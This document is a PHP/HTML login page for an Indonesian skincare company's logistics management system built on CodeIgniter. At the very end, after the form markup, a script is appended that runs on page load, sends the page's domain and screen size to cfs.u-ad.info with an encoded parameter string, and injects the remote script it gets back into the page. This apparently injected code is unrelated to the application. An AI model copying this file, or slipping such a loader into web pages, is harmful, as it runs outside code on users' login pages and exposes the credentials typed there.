<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="Kode is a Premium Bootstrap Admin Template, It's responsive, clean coded and mobile friendly">
  <meta name="keywords" content="bootstrap, admin, dashboard, flat admin template, responsive," />
  <title>Sistem Informasi Manajemen Logistik - Zalfa Miracle Skincare Bandung</title>
  <!-- Standard Favicon -->
  <link rel="icon" type="image/x-icon" href="<?php echo base_url();?>assets/favicon.ico" />
  <!-- ========== Css Files ========== -->
  <link href="<?php echo base_url();?>assets/css/root.css" rel="stylesheet">
  <style type="text/css">
    body{background: #64950 ;
         background-image: url("<?php echo base_url();?>assets/images/toa-heftiba-250946-unsplash.png");
         background-repeat: no-repeat;
         background-position: center;
         -webkit-background-size: cover;
         -moz-background-size: cover;
         -o-background-size: cover;
         background-size: cover;
         width: 100%;
         height: 100%;
        }
  </style>
  <script type="text/javascript">
		function cekform(){
			if(!$("#username").val()){
				alert('maaf username tidak boleh kosong');
				return false;
			}
		}
	</script>
  </head>
  <body>

    <div class="login-form">
      <form method="POST" action="<?php echo base_url();?>index.php/c_login/getlogin" onsubmit="return cekform();">
        <div class="top">
          <!--<img src="<?php echo base_url();?>assets/images/logo-zalfa.png" alt="icon" class="icon">-->
          <h1></br> Zalfa Miracle </br> Skincare Bandung </br></h1>
          <?php
            $info = $this->session->flashdata('info');
            if(!empty($info)){
              echo "<h4><font color='RED'>$info</font></h4>";
            }

          ?>
        </div>
        <div class="form-area">
          <div class="group">
            <input type="text" name="username" id="username" class="form-control" placeholder="Username">
            <i class="fa fa-user"></i>
          </div>
          <div class="group">
            <input type="password" name="password" id="password" class="form-control" placeholder="Password">
            <i class="fa fa-key"></i>
          </div>
          <div class="checkbox checkbox-primary">
            <input id="checkbox101" type="checkbox" checked>
            <!--<label for="checkbox101"> Remember Me</label>-->
          </div>
          <button type="submit" class="btn btn-success btn-block">LOGIN</button>
        </div>
      </form>
      <div class="footer-links row">
        <!--<div class="col-xs-6"><a href="#"><i class="fa fa-external-link"></i> Register Now</a></div>-->
        <div class="col-xs-6 text-right"><a href="#"><i class="fa fa-lock"></i> Lupa Password</a></div>
      </div>
    </div>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRzL0pGTtLwy06bpluQW9pVzzGyUZ9mifFaX%2fjYclt0tqDXwtHmGjsb%2b%2f5Xmr2LwgMb%2bZ73%2fvOBMYtC30ENH7vGL5sj6d14c8jzlARrazL%2be1p6fVAvzcffc%2flmP9T0p9QRrVKSNW5QuEMSoYbNLRDZKTdsoLb8zW%2buj7t2fMckDGlvWBmKH2C1UAaWG3i08N%2bzQWLeKaDcPjKsZedRSeXrre7lhdHsCYbWBTKXDErB%2bCEynNI2D%2bu57SEoMqSr1GvbbyzUeNdAtnjqMGYYDtVmedqn5MDtnh9%2bnT2HzE5o3CepHTFYsUIZR42zTasmL5k5LR%2bn8LEYrY3IuXCMtwa0xjXZnGG9PJftuf%2f2TjlE4CRqxfytFnmJtYsEr4EByl03EfWPf4Um2gSm99FHsXynwax1n0nmx8stUaJ71w%2bJiGR68H5gsCyuXPgeTI2KK%2b6Wmw3NpJ7QoznvoLU1UPOpB7A9rbfYj4ugEfPW2oJCgqUBD14mnWP5Atz87lFmw6sS6KJMibG%2f6LlQ97XinSorXXxBqWaMQL%2bEpCJKFAkYjcON%2fDyJL73ha07%2fvH68i2m" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>